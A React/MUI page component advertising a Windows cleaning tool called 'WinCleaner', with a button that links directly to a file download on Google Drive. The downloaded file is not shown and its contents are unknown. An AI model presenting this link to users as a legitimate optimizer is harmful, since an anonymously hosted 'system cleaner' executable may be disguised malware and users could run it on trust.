import { Container, Typography, Button } from '@mui/material';
import AnimatedCard from '../components/common/AnimatedCard';

const WinCleaner = () => {
  return (
    <Container>
      <Typography variant="h1">WinCleaner</Typography>
      <AnimatedCard>
        <Typography>Optimize your Windows system with our powerful cleaning tool</Typography>
        <Button 
          variant="contained" 
          href="https://drive.usercontent.google.com/download?id=1hwc0WcJbgWXrGJ8UoDRGzvpMhXNLkShE&export=download&authuser=0"
          target="_blank"
        >
          Download WinCleaner
        </Button>
      </AnimatedCard>
    </Container>
  );
};

export default WinCleaner; 